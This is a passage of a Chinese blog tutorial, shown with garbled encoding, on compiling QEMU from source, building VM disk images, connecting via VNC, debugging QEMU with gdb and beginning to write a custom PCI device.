    <content type="html"><![CDATA[<p>ä¸å¦‚ VMWareğŸ‘‹</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>Qemu æ˜¯ä¸€æ¬¾å¼€æºçš„è™šæ‹Ÿæœºè½¯ä»¶ï¼Œæ”¯æŒå¤šç§ä¸åŒæ¶æ„çš„æ¨¡æ‹Ÿï¼ˆEmulationï¼‰ä»¥åŠé…åˆ kvm å®Œæˆå½“å‰æ¶æ„çš„è™šæ‹ŸåŒ–ï¼ˆVirtualizationï¼‰çš„ç‰¹æ€§ï¼Œæ˜¯å½“å‰æœ€ç«çƒ­çš„å¼€æºè™šæ‹Ÿæœºè½¯ä»¶</p><p><img src="https://s2.loli.net/2022/07/22/jfIDUCx5ZtMsHAY.png" alt="image.png"></p><p>Qemu çš„åŸºæœ¬è¿è¡Œæ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/26/9L7HtFUQlyZdwXD.png" alt="image.png"></p><p>æœ¬ç¯‡æ–‡ç« ç¬”è€…å°†ç®€è¦å™è¿°å¦‚ä½•ä»æºç ç¼–è¯‘ç‰¹å®šæ¶æ„çš„ Qemu å¹¶è¿›è¡Œä¸€å®šç¨‹åº¦çš„æ”¹é€ å·¥ä½œ</p><h2 id="PRE-å®‰è£…ä¾èµ–"><a href="#PRE-å®‰è£…ä¾èµ–" class="headerlink" title="PRE.å®‰è£…ä¾èµ–"></a>PRE.å®‰è£…ä¾èµ–</h2><p>å¤§æ¦‚éœ€è¦å®‰è£…è¿™äº›ä¾èµ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt -y install ninja-build build-essential zlib1g-dev pkg-config libglib2.0-dev binutils-dev libpixman-1-dev libfdt-dev</span><br></code></pre></td></tr></table></figure><h1 id="0x01-ä»æºç ç¼–è¯‘-QEMU"><a href="#0x01-ä»æºç ç¼–è¯‘-QEMU" class="headerlink" title="0x01.ä»æºç ç¼–è¯‘ QEMU"></a>0x01.ä»æºç ç¼–è¯‘ QEMU</h1><h2 id="ä¸€ã€è·å–-QEMU-æºç "><a href="#ä¸€ã€è·å–-QEMU-æºç " class="headerlink" title="ä¸€ã€è·å– QEMU æºç "></a>ä¸€ã€è·å– QEMU æºç </h2><p>å¤§æ¦‚æœ‰ä¸¤ç§é€”å¾„ï¼šä»å®˜ç½‘ä¸‹è½½æˆ–æ˜¯ç›´æ¥ä» Qemu çš„GitHub ä»“åº“æ‹‰ä¸‹æ¥ã€‚</p><h3 id="I-å®˜ç½‘ä¸‹è½½æºç "><a href="#I-å®˜ç½‘ä¸‹è½½æºç " class="headerlink" title="I.å®˜ç½‘ä¸‹è½½æºç "></a>I.å®˜ç½‘ä¸‹è½½æºç </h3><p>å‰å¾€ <a href="https://download.qemu.org/">qemu çš„å®˜ç½‘</a>è¿›è¡Œä¸‹è½½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://download.qemu.org/qemu-7.0.0.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf qemu-7.0.0.tar.xz</span><br></code></pre></td></tr></table></figure><h3 id="II-GitHub-è·å–æºç "><a href="#II-GitHub-è·å–æºç " class="headerlink" title="II. GitHub è·å–æºç "></a>II. GitHub è·å–æºç </h3><p>ç›´æ¥ä» <a href="https://github.com/qemu/qemu">GitHub</a> ä¸Šé¢æ‹‰ä¹Ÿè¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> git@github.com:qemu/qemu.git</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€é…ç½®ç¼–è¯‘é€‰é¡¹"><a href="#äºŒã€é…ç½®ç¼–è¯‘é€‰é¡¹" class="headerlink" title="äºŒã€é…ç½®ç¼–è¯‘é€‰é¡¹"></a>äºŒã€é…ç½®ç¼–è¯‘é€‰é¡¹</h2><p>æ¥ä¸‹æ¥åˆ›å»º build ç›®å½•å¹¶é…ç½®å¯¹åº”çš„ç¼–è¯‘é€‰é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> build</span><br><span class="hljs-meta prompt_">build$ </span><span class="language-bash">../qemu-7.0.0/configure --enable-kvm --target-list=x86_64-softmmu --enable-debug</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šäº†è¿™å‡ ä¸ªç¼–è¯‘é€‰é¡¹ï¼š</p><ul><li><code>--enable-kvm</code>ï¼šå¼€å¯ kvm æ”¯æŒ</li><li><code>--target-list=&lt;æ¶æ„å&gt;</code>ï¼šæŒ‡å®šè¦ç¼–è¯‘çš„ CPU æ¶æ„ï¼Œè¿™é‡Œæˆ‘ä»¬æŒ‡å®šä¸º <code>x86_64-softmmu</code> å³è¡¨ç¤ºæˆ‘ä»¬è¦ç¼–è¯‘ x86 æ¶æ„çš„ 64ä½ CPU</li><li><code>--enable-debug</code>ï¼šèƒ½å¤Ÿå¯¹ Qemu è¿›è¡Œè°ƒè¯•</li></ul><blockquote><p>å¦‚æœæˆ‘ä»¬ä¸æŒ‡å®šçš„è¯ä¼šæŠŠæ‰€æœ‰æ¶æ„éƒ½ç¼–è¯‘ä¸€éï¼Œä¸è¿‡è¿™é‡Œç¬”è€…åªéœ€è¦ x86 çš„ï¼›ï¼‰</p></blockquote><h2 id="ä¸‰ã€å¼€å§‹ç¼–è¯‘"><a href="#ä¸‰ã€å¼€å§‹ç¼–è¯‘" class="headerlink" title="ä¸‰ã€å¼€å§‹ç¼–è¯‘"></a>ä¸‰ã€å¼€å§‹ç¼–è¯‘</h2><p>ç›´æ¥ make å°±å®Œäº‹äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>éœ€è¦èŠ±çš„æ—¶é—´è¿˜æ˜¯ä¸çŸ­çš„ï¼Œåœ¨ç¬”è€…çš„å°ç ´æœåŠ¡å™¨ä¸Šç¼–è¯‘å¤§æ¦‚éœ€è¦åå‡ åˆ†é’Ÿå·¦å³ï¼Œå¤§æ¦‚ç¼–è¯‘äº†ä¸¤åƒå¤šä¸ªæ–‡ä»¶ï¼Œå®Œæˆä¹‹ååœ¨å½“å‰ç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªçƒ­ä¹ä¹çš„å¯æ‰§è¡Œæ–‡ä»¶ <code>qemu-system_x86-64</code>ï¼Œè¿™ä¸ªå°±æ˜¯ Qemu çš„æœ¬ä½“äº†</p><p>ä¹‹åå¯ä»¥ make install ç»™ä»–å®‰åˆ° bin é‡Œè¾¹ï¼Œè¿™æ ·å°±èƒ½ç›´æ¥ä»å‘½ä»¤è¡Œå¯åŠ¨äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><h1 id="0x02-æ„å»ºç³»ç»Ÿé•œåƒå¹¶ä½¿ç”¨-vnc-è¿æ¥"><a href="#0x02-æ„å»ºç³»ç»Ÿé•œåƒå¹¶ä½¿ç”¨-vnc-è¿æ¥" class="headerlink" title="0x02.æ„å»ºç³»ç»Ÿé•œåƒå¹¶ä½¿ç”¨ vnc è¿æ¥"></a>0x02.æ„å»ºç³»ç»Ÿé•œåƒå¹¶ä½¿ç”¨ vnc è¿æ¥</h1><p>ç©ºæœ‰ä¸€ä¸ª <code>qemu</code> çš„å¯æ‰§è¡Œæ–‡ä»¶è¿˜ä¸è¡Œï¼Œæˆ‘ä»¬æœ€ç»ˆè¿˜æ˜¯è¦åœ¨ qemu ä¸Šé¢è·‘ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿçš„ï¼Œé‚£ä¹ˆè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>ä½¿ç”¨ <code>qemu-img</code> åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶ï¼Œé€šè¿‡ <code>-cdrom</code> å‚æ•°æŒ‡å®šè½½å…¥ä¸€ä¸ª ISO é•œåƒæ–‡ä»¶æ¥å®‰è£…ä¸€ä¸ªç°æœ‰çš„æ“ä½œç³»ç»Ÿ</li><li>ä½¿ç”¨ <code>debootstrap</code> åˆ›å»º ext4 ç¡¬ç›˜é•œåƒï¼Œå¹¶ç›´æ¥è¿è¡Œä¸€ä¸ªç°æˆçš„è£¸çš„å†…æ ¸é•œåƒæ–‡ä»¶ï¼ˆbzImageï¼‰</li></ul><h2 id="ä¸€ã€åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å¹¶é€šè¿‡-CDROM-å®‰è£…-Ubuntu"><a href="#ä¸€ã€åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å¹¶é€šè¿‡-CDROM-å®‰è£…-Ubuntu" class="headerlink" title="ä¸€ã€åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å¹¶é€šè¿‡ CDROM å®‰è£… Ubuntu"></a>ä¸€ã€åˆ›å»ºè™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å¹¶é€šè¿‡ CDROM å®‰è£… Ubuntu</h2><h3 id="I-ä½¿ç”¨-qemu-img-åˆ›å»ºè™šæ‹Ÿæœºç£ç›˜é•œåƒæ–‡ä»¶"><a href="#I-ä½¿ç”¨-qemu-img-åˆ›å»ºè™šæ‹Ÿæœºç£ç›˜é•œåƒæ–‡ä»¶" class="headerlink" title="I.ä½¿ç”¨ qemu-img åˆ›å»ºè™šæ‹Ÿæœºç£ç›˜é•œåƒæ–‡ä»¶"></a>I.ä½¿ç”¨ <code>qemu-img</code> åˆ›å»ºè™šæ‹Ÿæœºç£ç›˜é•œåƒæ–‡ä»¶</h3><p>è¿™ä¸€æ­¥æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯ç”¨ <code>build</code> ç›®å½•ä¸‹çš„ <code>qemu-img</code> æ¥å®Œæˆæ„å»ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./build/qemu-img create -f qcow2 test.qcow2 20G</span><br>Formatting &#x27;test.qcow2&#x27;, fmt=qcow2 cluster_size=65536 extended_l2=off compression_type=zlib size=21474836480 lazy_refcounts=off refcount_bits=16<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>-f</code> å‚æ•°æŒ‡å®šçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºé•œåƒæ ¼å¼ï¼Œè¿™é‡Œä½¿ç”¨ QEMU æœ€é€šç”¨çš„æ ¼å¼ <code>qcow2</code>ï¼›ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–‡ä»¶è·¯å¾„ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºé•œåƒå¤§å°</p><blockquote><p>å‚è§<a href="https://docs.fedoraproject.org/zh-CN/Fedora/12/html/Virtualization_Guide/sect-Virtualization_Guide-Tips_and_tricks-Using_qemu_img.html">è¿™é‡Œ</a></p></blockquote><h3 id="II-é€šè¿‡-vnc-è¿æ¥å®Œæˆå®‰è£…"><a href="#II-é€šè¿‡-vnc-è¿æ¥å®Œæˆå®‰è£…" class="headerlink" title="II.é€šè¿‡ vnc è¿æ¥å®Œæˆå®‰è£…"></a>II.é€šè¿‡ vnc è¿æ¥å®Œæˆå®‰è£…</h3><p>åœ¨ qemu å¯åŠ¨æ—¶é€šè¿‡ <code>-cdrom</code> å‚æ•°å¯ä»¥æŒ‡å®šåŠ è½½çš„ISOæ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©å®‰è£…ä¸€ä¸ª Ubuntu 22.04ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso</span><br>VNC server running on ::1:5900<br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>-m</code>ï¼šè™šæ‹Ÿæœºçš„å†…å­˜å¤§å°</li><li><code>-drive</code> ï¼šqemu å¯åŠ¨æ—¶é¢å¤–åŠ è½½çš„è®¾å¤‡ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>format=qcow2,file=test.qcow2</code> æŒ‡å®šäº†åŠ è½½è®¾å¤‡ <code>test.qcow2</code>ã€æ ¼å¼ä¸º <code>qcow2</code></li><li><code>-enable-kvm</code> ï¼šå¯ç”¨ kvm æ¨¡å¼ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥é€‰é¡¹<strong>è¦æ±‚ä»¥ root æƒé™è¿è¡Œ</strong></li><li><code>-cdrom</code>ï¼šæŒ‡å®š qemu å¯åŠ¨æ—¶è£…è½½çš„å…‰ç¢Ÿæ–‡ä»¶è·¯å¾„</li></ul><p>å¯åŠ¨å qemu é»˜è®¤ä¼šåœ¨ 5900 ç«¯å£å¯åŠ¨ä¸€ä¸ª VNC serverï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿èƒ½é€šè¿‡ VNC è¿æ¥åˆ° qemu ä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œ<strong>åªèƒ½åœ¨æœ¬åœ°è¿›è¡Œè¿æ¥</strong></p><p>å¦‚æœæ˜¯è¿è¡Œåœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„è¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é¢å¤–æŒ‡å®š <code>-vnc</code> å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./build/qemu-system-x86_64 -m 2G -drive format=qcow2,file=test.qcow2 -enable-kvm -cdrom ~/Download/ubuntu-22.04-desktop-amd64.iso -vnc yourip:0</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>vnc</code> å‚æ•°ä¸­ ip åé¢è·Ÿç€çš„ä¸æ˜¯ç«¯å£å·ï¼Œè€Œæ˜¯ <code>display numer</code>ï¼Œå¯¹äºé»˜è®¤çš„ <code>display 0</code> è€Œè¨€å…¶ç›‘å¬çš„ç«¯å£å·ä¸º <code>5900</code>ï¼Œè€Œ <code>display 1</code> å°±æ˜¯ <code>5901</code> ç«¯å£ï¼Œä»¥æ­¤ç±»æ¨</p><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½é€šè¿‡ vnc è¿æ¥ä¸Šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ qemu äº†ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ <code>VNC Viewer</code> è¿›è¡Œè¿æ¥ï¼š</p><p><img src="https://s2.loli.net/2022/07/11/3juM5iAgFERhYsS.png" alt="image.png"></p><p>æˆåŠŸè¿æ¥ä¸Šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ qemuï¼š</p><p><img src="https://s2.loli.net/2022/07/11/UdlOA6DGaPFJqx2.png" alt="image.png"></p><p>ä¹‹åå°±æ˜¯å¸¸è§„çš„å®‰è£…æµç¨‹äº†ï¼Œä¸è¿‡å¯èƒ½æ˜¯ç”±äº qemu æ¨¡æ‹Ÿæ˜¾å¡çš„é—®é¢˜ï¼ˆæˆ–è€…æ˜¯ VNC é…ç½®çš„é—®é¢˜ï¼‰ï¼Œåœ¨ä¸€å¼€å§‹çš„æ—¶å€™å®‰è£…ç•Œé¢çš„é¢œè‰²ä¼šæœ‰ç‚¹å¤±çœŸï¼š</p><p><img src="https://s2.loli.net/2022/07/11/lsp4rnZqSdbcIGL.png" alt="image.png"></p><p>ä¸è¿‡åœ¨å®‰è£…å‡†å¤‡ç»“æŸçš„æ—¶å€™åˆæ¢å¤æ­£å¸¸çš„é¢œè‰²äº†ï¼Œç¬”è€…ç›®å‰æ¨æµ‹åº”è¯¥æ˜¯å’Œæ˜¾å¡é©±åŠ¨æœ‰å…³ï¼š</p><p><img src="https://s2.loli.net/2022/07/11/g5jCb8yzmQYsvMd.png" alt="image.png"></p><p>ä¹‹åå°±å’Œæ­£å¸¸ä½¿ç”¨è™šæ‹Ÿæœºæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«äº†ï¼Œä¸‹æ¬¡å†æ¬¡å¯åŠ¨å°±ä¸éœ€è¦æŒ‡å®š <code>-cdrom</code> å‚æ•°äº†</p><p><img src="https://s2.loli.net/2022/07/11/WZiEx6vqnYapdl7.png" alt="image.png"></p><h2 id="äºŒã€æ„å»º-ext4-ç£ç›˜é•œåƒå¹¶è¿è¡Œ-kernel-bzImage"><a href="#äºŒã€æ„å»º-ext4-ç£ç›˜é•œåƒå¹¶è¿è¡Œ-kernel-bzImage" class="headerlink" title="äºŒã€æ„å»º ext4 ç£ç›˜é•œåƒå¹¶è¿è¡Œ kernel bzImage"></a>äºŒã€æ„å»º ext4 ç£ç›˜é•œåƒå¹¶è¿è¡Œ kernel bzImage</h2><p>å¦‚æœä½ ä¸éœ€è¦ä¸€ä¸ªå®Œæ•´çš„å‘è¡Œç‰ˆ Linux ç³»ç»Ÿç¯å¢ƒï¼Œåªæ˜¯æƒ³è·‘ä¸€ä¸ªè£¸çš„ç®€æ˜“çš„å†…æ ¸ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼å®Œæˆï¼š</p><h3 id="I-æ„å»ºç£ç›˜é•œåƒ"><a href="#I-æ„å»ºç£ç›˜é•œåƒ" class="headerlink" title="I.æ„å»ºç£ç›˜é•œåƒ"></a>I.æ„å»ºç£ç›˜é•œåƒ</h3><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>debootstrap</code> æ¥åˆ›å»ºext4ç¡¬ç›˜é•œåƒï¼Œç›´æ¥ä½¿ç”¨ç”± Google å›¢é˜Ÿä¸º syzkaller æ„å»ºç£ç›˜é•œåƒçš„è„šæ­¥å³å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> image</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> image</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x create-image.sh</span><br><span class="hljs-meta prompt_">image$ </span><span class="language-bash">./create-image.sh</span><br></code></pre></td></tr></table></figure><p>å®Œæˆä¹‹ååœ¨å½“å‰ç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªçƒ­ä¹ä¹çš„ <code>stretch.img</code>ï¼Œè¿™ä¾¿æ˜¯ ext4 ç£ç›˜é•œåƒæ–‡ä»¶äº†</p><blockquote><p>wget çš„è¿™ä¸€æ­¥<strong>éœ€è¦ç¿»å¢™</strong>ï¼ˆ<code>raw.githubusercontent.com</code> åœ¨å›½å†…ä¼¼ä¹æ˜¯è¢«å¢™äº†ï¼Œæ€»ä¹‹ç¬”è€…è®°å¿†é‡Œä»æ²¡æˆåŠŸåœ¨ä¸ç¿»å¢™çš„æƒ…å†µä¸‹æˆåŠŸä¸Šå»è¿‡ï¼‰ï¼Œè‹¥å«Œéº»çƒ¦å¯ä»¥ç›´æ¥ copy <a href="/download/create-image.sh">ç¬”è€…å·²ç»ä¸‹å¥½çš„</a></p></blockquote><h3 id="II-è·å–-kernel-bzImage"><a href="#II-è·å–-kernel-bzImage" class="headerlink" title="II.è·å– kernel bzImage"></a>II.è·å– kernel bzImage</h3><p>è¿™éƒ¨åˆ†å‚è§<a href="http://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/#0x01-%E8%8E%B7%E5%8F%96%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F%EF%BC%88bzImage%EF%BC%89">è¿™é‡Œ</a></p><h3 id="III-è¿è¡Œ-qemu-å¹¶é€šè¿‡-vnc-è¿›è¡Œè¿æ¥"><a href="#III-è¿è¡Œ-qemu-å¹¶é€šè¿‡-vnc-è¿›è¡Œè¿æ¥" class="headerlink" title="III.è¿è¡Œ qemu å¹¶é€šè¿‡ vnc è¿›è¡Œè¿æ¥"></a>III.è¿è¡Œ qemu å¹¶é€šè¿‡ vnc è¿›è¡Œè¿æ¥</h3><p>åˆ›å»ºå¦‚ä¸‹ bash è„šæœ¬å¹¶è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>qemu-system-x86_64 \<br>-m 2G \<br>-smp 2 \<br>-kernel ./bzImage \<br>-append <span class="hljs-string">&quot;root=/dev/sda&quot;</span> \<br>-drive file=./stretch.img,format=raw \<br>-enable-kvm \<br>-vnc yourip:0<br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯ç›´æ¥ç”¨ vnc è¿›è¡Œè¿æ¥å³å¯ï¼ˆå¦‚æœåªéœ€è¦åœ¨æœ¬åœ°è¿è¡Œçš„è¯å¯ä»¥ä¸ç”¨é™„åŠ  <code>-vnc</code> å‚æ•°ï¼Œè€Œæ˜¯åŠ ä¸Š <code>-nographic</code> å‚æ•°ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2022/07/12/yjcVlhtYOz4pQvC.png" alt="image.png"></p><h1 id="0x03-QEMU-æºç è°ƒè¯•"><a href="#0x03-QEMU-æºç è°ƒè¯•" class="headerlink" title="0x03. QEMU æºç è°ƒè¯•"></a>0x03. QEMU æºç è°ƒè¯•</h1><p>QEMU å…è®¸æˆ‘ä»¬é€šè¿‡ <code>-s</code> æˆ–æ˜¯ <code>-gdb tcp::1234</code> è¿™æ ·çš„é™„åŠ å‚æ•°æ¥è°ƒè¯•è™šæ‹Ÿæœºï¼ˆæ¯”å¦‚è¯´è°ƒè¯• Linux kernelï¼‰ï¼Œä½†æœ‰çš„æ—¶å€™æˆ‘ä»¬æƒ³è¦<strong>ç›´æ¥è°ƒè¯• QEMU æœ¬ä½“</strong>ï¼ˆæ¯”å¦‚è¯´è°ƒè¯•ä¸€äº›è‡ªå·±å†™çš„æ¨¡æ‹Ÿè®¾å¤‡ï¼‰ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬å°† Host ä¸Šçš„ QEMU è¿›ç¨‹ä½œä¸ºå¾…è°ƒè¯•å¯¹è±¡</p><p>å› ä¸º QEMU æœ¬èº«ä¹Ÿæ˜¯åœ¨ Host ä¸Šè¿è¡Œçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥ç¬”è€…è¿™é‡Œç»™å‡ºä¸€ä¸ªæ¯”è¾ƒç›´æ¥çš„è°ƒè¯• QEMU çš„åŠæ³•ï¼šæŠŠ QEMU æœ¬ä½“å¯åŠ¨èµ·æ¥åç›´æ¥ç”¨ <code>ps</code> æ‰¾ QEMU è¿›ç¨‹ç„¶å gdb attach  å³å¯åƒæ­£å¸¸è°ƒè¯•ä¸€ä¸ªæ™®é€šè¿›ç¨‹ä¸€æ ·è°ƒè¯• QEMUï¼š</p><p><img src="https://s2.loli.net/2023/04/13/ocrYWTQ4Nw3LEh5.png" alt="image.png"></p><p>å¦‚æœæ˜¯è‡ªå·±ç¼–è¯‘çš„ QEMU è¿™æ ·å°±å¯ä»¥ç›´æ¥ä»æºç è¿›è¡Œè°ƒè¯•äº†ï¼š</p><p><img src="https://s2.loli.net/2023/04/13/ol9OLkRDcusndU4.png" alt="image.png"></p><h1 id="0x04-ç®€æ˜“-QEMU-è®¾å¤‡ç¼–å†™"><a href="#0x04-ç®€æ˜“-QEMU-è®¾å¤‡ç¼–å†™" class="headerlink" title="0x04.ç®€æ˜“ QEMU è®¾å¤‡ç¼–å†™"></a>0x04.ç®€æ˜“ QEMU è®¾å¤‡ç¼–å†™</h1><p>è™½ç„¶ Qemu æ”¯æŒæ¨¡æ‹Ÿå¤šç§è®¾å¤‡ï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ¶µç›–ç°å­˜æ‰€æœ‰çš„è®¾å¤‡ç±»å‹ï¼ŒåŒæ—¶æœ‰çš„æ—¶å€™å‡ºäºä¸€äº›ç‰¹æ®Šçš„ç›®çš„æˆ‘ä»¬ä¹Ÿéœ€è¦è‡ªå®šä¹‰ä¸€äº›è®¾å¤‡ï¼Œå› æ­¤æœ¬èŠ‚ä¸»è¦è®²è¿°å¦‚ä½•åœ¨ Qemu å½“ä¸­ç¼–å†™ä¸€ä¸ªæ–°çš„ PCI ç±»å‹çš„è®¾å¤‡</p><blockquote><p>æ³¨1ï¼šåœ¨å¼€å§‹ä¹‹å‰ä½ å¯èƒ½éœ€è¦è¡¥å……ä¸€äº›<a href="https://arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/">PCI è®¾å¤‡çš„åŸºç¡€çŸ¥è¯†</a></p><p>æ³¨2ï¼šqemu å®˜æ–¹åœ¨ <code>hw/misc/edu.c</code> ä¸­ä¹Ÿæä¾›äº†ä¸€ä¸ªæ•™å­¦ç”¨çš„è®¾å¤‡æ ·ä¾‹ï¼Œred hat åˆ™åœ¨ <code>hw/misc/pci-testdev.c</code> ä¸­æä¾›äº†ä¸€ä¸ªæµ‹è¯•è®¾å¤‡ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒè¿™ä¸¤ä¸ªè®¾å¤‡æ¥æ„å»ºæˆ‘ä»¬çš„è®¾å¤‡</p></blockquote><h2 id="ä¸€ã€Qemu-Object-Model"><a href="#ä¸€ã€Qemu-Object-Model" class="headerlink" title="ä¸€ã€Qemu Object Model"></a>ä¸€ã€Qemu Object Model</h2><p>è™½ç„¶ Qemu æ˜¯ä½¿ç”¨ C ç¼–å†™çš„ï¼Œä½†æ˜¯å…¶ä»£ç ä¹Ÿå……æ»¡äº† OOP çš„æ€æƒ³ï¼Œåœ¨ Qemu å½“ä¸­æœ‰ç€ä¸€å¥—å«åš <strong>Qemu Object Model</strong> çš„ä¸œè¥¿æ¥å®ç°é¢å‘å¯¹è±¡ï¼Œä¸»è¦ç”±è¿™å››ä¸ªç»„ä»¶æ„æˆï¼š</p><ul><li><code>Type</code>ï¼šç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„åŸºæœ¬å±æ€§ï¼Œä¾‹å¦‚ç±»çš„åå­—ã€å¤§å°ã€æ„é€ å‡½æ•°ç­‰</li><li><code>Class</code>ï¼šç”¨æ¥å®šä¹‰ä¸€ä¸ªã€Œç±»ã€çš„é™æ€å†…å®¹ï¼Œä¾‹å¦‚ç±»ä¸­å­˜å‚¨çš„é™æ€æ•°æ®ã€æ–¹æ³•å‡½æ•°æŒ‡é’ˆç­‰</li><li><code>Object</code>ï¼šåŠ¨æ€åˆ†é…çš„ä¸€ä¸ªã€Œç±»ã€çš„å…·ä½“çš„å®ä¾‹ï¼ˆinstanceï¼‰ï¼Œå‚¨å­˜ç±»çš„åŠ¨æ€æ•°æ®</li><li><code>Property</code>ï¼šåŠ¨æ€å¯¹è±¡æ•°æ®çš„è®¿é—®å™¨ï¼ˆaccessorï¼‰ï¼Œå¯ä»¥é€šè¿‡ç›‘è§†å™¨æ¥å£è¿›è¡Œæ£€æŸ¥</li></ul><p>ç±»ä¼¼äº Golangï¼Œåœ¨ QOM 